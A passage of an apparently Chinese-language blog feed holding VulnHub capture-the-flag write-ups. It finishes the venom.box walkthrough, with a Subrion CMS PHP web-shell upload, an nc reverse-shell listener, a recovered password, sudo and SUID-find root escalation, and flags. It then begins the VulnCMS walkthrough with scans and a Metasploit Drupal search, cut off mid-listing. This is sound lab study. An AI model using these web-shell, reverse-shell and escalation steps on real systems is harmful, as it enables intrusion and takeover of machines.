</span><br></pre></td></tr></table></figure><p>第一段需要解码4次，第二段解码为一个网址</p><p>整理信息：</p><ul><li>解码bash64得到相关信息</li><li>盒子主机名为<code>venom.box</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You need to follow the &#x27;hostinger&#x27; on standard vigenere cipher also https://cryptii.com/pipes/vigenere-cipher</span><br></pre></td></tr></table></figure></li></ul><p>添加主机名到主机文件中，访问域名可得到新的页面，此处参考另一种思路，在<code>https://cryptii.com/pipes/vigenere-cipher</code>可以解密得到<code>dora</code>的密码</p><p><img src="/images/pasted-22.png" class="lazyload" data-srcset="/images/pasted-22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h2 id="登录venom-box"><a href="#登录venom-box" class="headerlink" title="登录venom.box"></a>登录venom.box</h2><p><img src="/images/pasted-23.png" class="lazyload" data-srcset="/images/pasted-23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>此处可以看到版本信息为<code>Subrion CMS 4.2.1</code><br>在<code>exploit-db</code>中搜索可以得到该版本存在一个文件上传漏洞</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="/images/pasted-25.png" class="lazyload" data-srcset="/images/pasted-25.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>通过构造一句话木马上传后以获得shell，根据提示可以得知因为该版本中<code>.htaccess</code>文件中忽略了<code> .pht、 .phar</code>文件后缀的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> php-shell.phar </span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[cmd]); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-26.png" class="lazyload" data-srcset="/images/pasted-26.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>成功执行命令</p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>通过前面上传的一句话木马执行python反向连接shell<br><img src="/images/pasted-28.png" class="lazyload" data-srcset="/images/pasted-28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>此时需要监听4444 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444                                                                                                                                                               1 ⨯</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.109.140] from venom.box [192.168.109.147] 33098</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure><p>成功获取shell<br>此时是在<code>upload</code>目录的<br>切换到<code>home</code>目录下查看存在用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">ls</span> -lart</span><br><span class="line"><span class="built_in">ls</span> -lart</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 24 root      root      4096 May 20 10:08 ..</span><br><span class="line">drwxr-xr-x  4 root      root      4096 May 21 17:00 .</span><br><span class="line">drwxr-x--- 17 nathan    nathan    4096 May 22 00:21 nathan</span><br><span class="line">drwxr-xr-x 16 hostinger hostinger 4096 May 22 13:58 hostinger</span><br></pre></td></tr></table></figure><p>使用<code>hostinger/hostinger</code>登录，登录成功后在<code>/var/www/html/subrion/backup</code>下<code>.htaccess</code>文件中存在<code>nathan</code>密码</p><p>切换<code>nathan</code>用户，可获取第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">su nathan</span><br><span class="line">su nathan</span><br><span class="line">Password: FzN+f2-rRaBgvALzj*Rk<span class="comment">#_JJYfg8XfKhxqB82x_a</span></span><br><span class="line"></span><br><span class="line">nathan@venom:/var/www/html/subrion/backup$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(nathan) gid=1000(nathan) <span class="built_in">groups</span>=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">nathan@venom:/var/www/html/subrion/backup$ <span class="built_in">cd</span> </span><br><span class="line"><span class="built_in">cd</span> </span><br><span class="line">nathan@venom:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Desktop    Downloads         Music     Public     user.txt</span><br><span class="line">Documents  examples.desktop  Pictures  Templates  Videos</span><br><span class="line">nathan@venom:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">W3_@r3_V3n0m:P</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试<code>sudo</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br><span class="line">sudo -l </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nathan on venom:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User nathan may run the following commands on venom:</span><br><span class="line">    (root) ALL, !/bin/su</span><br><span class="line">    (root) ALL, !/bin/su</span><br></pre></td></tr></table></figure><p>参考得知这里直接运行<code>sudo bash</code>即可提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br><span class="line">sudo -l </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nathan on venom:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User nathan may run the following commands on venom:</span><br><span class="line">    (root) ALL, !/bin/su</span><br><span class="line">    (root) ALL, !/bin/su</span><br><span class="line">nathan@venom:~$ sudo bash</span><br><span class="line">sudo bash</span><br><span class="line">root@venom:~<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure><p>第二种方式<br>通过查找设置了SUID位的文件<br><code>find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nathan@venom:~$ find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">-rwsr-xr-x 1 root root 1473576 Apr 20 10:15 /opt/VBoxGuestAdditions-6.1.20/bin/VBoxDRMClient</span><br><span class="line">-rwsr-s--- 1 root nathan 238080 Nov  5  2017 /usr/bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 23  2019 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 23  2019 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 23  2019 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 23  2019 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 23  2019 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-rwsr-sr-x 1 root root 10232 Jul  3  2020 /usr/lib/xorg/Xorg.wrap</span><br><span class="line">-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 23  2019 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Sep 17  2020 /snap/core18/2066/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2066/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 23  2019 /snap/core18/2066/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Sep 17  2020 /snap/core18/2066/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 23  2019 /snap/core18/2066/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 23  2019 /snap/core18/2066/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 23  2019 /snap/core18/2066/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 23  2019 /snap/core18/2066/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 23  2019 /snap/core18/2066/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2066/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2066/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/2066/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1885/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1885/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 23  2019 /snap/core18/1885/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1885/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 23  2019 /snap/core18/1885/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 23  2019 /snap/core18/1885/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 23  2019 /snap/core18/1885/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 23  2019 /snap/core18/1885/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 23  2019 /snap/core18/1885/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo</span><br><span class="line">-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 110792 Jul 11  2020 /snap/snapd/8542/usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 111080 Apr 24 17:35 /snap/snapd/11841/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure><p>这里参考网上思路，使用<code>find</code>进行提权并读取第二个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/nathan</span><br><span class="line">$ /usr/bin/find . -<span class="built_in">exec</span> /bin/sh -p \; -quit         </span><br><span class="line">/usr/bin/find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(nathan) gid=1000(nathan) euid=0(root) <span class="built_in">groups</span>=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"><span class="comment"># cd /root/</span></span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line"><span class="comment">#root_flag</span></span><br><span class="line">H@v3_a_n1c3_l1fe.</span><br></pre></td></tr></table></figure><p><strong>done</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>不够细心</li><li>没有清晰的渗透步骤，脑子太乱</li><li>坚持</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-VulnCMS</title>
      <link href="/10746.html"/>
      <url>/10746.html</url>
      
        <content type="html"><![CDATA[<h2 id="记录打靶机（VulnCMS）过程"><a href="#记录打靶机（VulnCMS）过程" class="headerlink" title="记录打靶机（VulnCMS）过程"></a>记录打靶机（VulnCMS）过程</h2><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><strong>主机发现</strong><br>使用<code>arp-scan</code>进行主机IP发现，探测网段中目标主机IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 192.168.109.0/24</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.109.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.109.2   00:50:56:f0:a1:15       VMware, Inc.</span><br><span class="line">192.168.109.145 00:0c:29:da:98:92       VMware, Inc.</span><br><span class="line">192.168.109.254 00:50:56:f8:89:68       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 1.938 seconds (132.09 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>经探测发现目标IP地址为<code>192.168.109.145</code>，接着使用<code>nmap</code>对该IP地址进行端口扫描</p><p><strong>端口扫描</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sC -sV -p- 192.168.109.145</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 12:43 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.109.145</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)</span><br><span class="line">|   256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)</span><br><span class="line">|_  256 fa:c9:eb:58:e3:d2:b7:4a:74:77:<span class="built_in">fc</span>:69:0e:b6:68:08 (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: W3.CSS Template</span><br><span class="line">5000/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.7.2</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: fsociety &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">8081/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">| http-robots.txt: 15 disallowed entries </span><br><span class="line">| /joomla/administrator/ /administrator/ /bin/ /cache/ </span><br><span class="line">| /cli/ /components/ /includes/ /installation/ /language/ </span><br><span class="line">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">9001/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: fsociety.web</span><br><span class="line">MAC Address: 00:0C:29:DA:98:92 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 18.84 seconds</span><br></pre></td></tr></table></figure><p>经<code>nmap</code>扫描后发现存在22（ssh）、80（http）、5000（http）、8081（http）、9001（http）<br>因为此靶机除了22（ssh）端口以外其他都是<code>http</code>服务相关的，在漏洞数据库搜索了<code>openssh 7.6</code>后显示存在一个用户名爆破漏洞，但是用处应该不大，因为还需要密码；翻找了其他<code>http</code>服务相关的页面无可用信息（这里主要使用的是目录扫描）。</p><p>但是可以从<code>nmap</code>扫描信息中看到在9001端口运行了<code>Drupal 7</code>服务，之前做相关靶机学习时得知此服务存在exp，这里可以使用<code>msfconsole</code>框架进行搜索加载相关exp。这里有点问题，在做的时候因为用错了exp始终无法返回shell，后面参考了网络上相关文章，此处应该使用<code>exploit/unix/webapp/drupal_drupalgeddon2</code>。</p><p><strong>漏洞利用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">                                                  </span><br><span class="line">                                              `:oDFo:`                            </span><br><span class="line">                                           ./ymM0dayMmy/.                          </span><br><span class="line">                                        -+dHJ5aGFyZGVyIQ==+-                    </span><br><span class="line">                                    `:sm⏣~~Destroy.No.Data~~s:`                </span><br><span class="line">                                 -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          </span><br><span class="line">                          ./etc/shadow.0days-Data<span class="string">&#x27;%20OR%201=1--.No.0MN8&#x27;</span>/.      </span><br><span class="line">                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    </span><br><span class="line">                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  </span><br><span class="line">                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">                      :we<span class="string">&#x27;re.all.alike&#x27;</span>`                     The.PFYroy.No.D7:  </span><br><span class="line">                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">                      :msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">                      :---srwxrwx:-.`                        `MS146.52.No.Per:    </span><br><span class="line">                      :&lt;script&gt;.Ac816/                        sENbove3101.404:    </span><br><span class="line">                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    </span><br><span class="line">                      :09.14.2011.raid                       /STFU|wall.No.Pr:    </span><br><span class="line">                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">                      :<span class="comment">#OUTHOUSE-  -s:                       /corykennedyData:    </span></span><br><span class="line">                      :<span class="variable">$nmap</span> -oS                              SSo.6178306Ence:    </span><br><span class="line">                      :Awsm.da:                            /shMTl<span class="comment">#beats3o.No.:    </span></span><br><span class="line">                      :Ring0:                             `dDestRoyREXKC3ta/M:    </span><br><span class="line">                      :23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line">                       /-                        /yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                                                 `:Shall.We.Play.A.Game?tron/    </span><br><span class="line">                                                 ```-ooy.if1ghtf0r+ehUser5`    </span><br><span class="line">                                               ..th3.H1V3.U2VjRFNN.jMh+.`          </span><br><span class="line">                                              `MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                                               +~KANSAS.CITY<span class="string">&#x27;s~-`                  </span></span><br><span class="line"><span class="string">                                                J~HAKCERS~./.`                    </span></span><br><span class="line"><span class="string">                                                .esc:wq!:`                        </span></span><br><span class="line"><span class="string">                                                 +++ATH`                            </span></span><br><span class="line"><span class="string">                                                  `</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v6.0.30-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit tip: When in a module, use back to go </span></span><br><span class="line"><span class="string">back to the top level prompt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 &gt; search Drupal</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Matching Modules</span></span><br><span class="line"><span class="string">================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   #  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line"><span class="string">   -  ----                                           ---------------  ----       -----  -----------</span></span><br><span class="line"><span class="string">   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span></span><br><span class="line"><span class="string">   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span></span><br><span class="line"><span class="string">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span></span><br><span class="line"><span class="string">   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span></span><br><span class="line"><span class="string">   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span></span><br><span class="line"><span class="string">   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span></span><br><span class="line"><span class="string">   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() 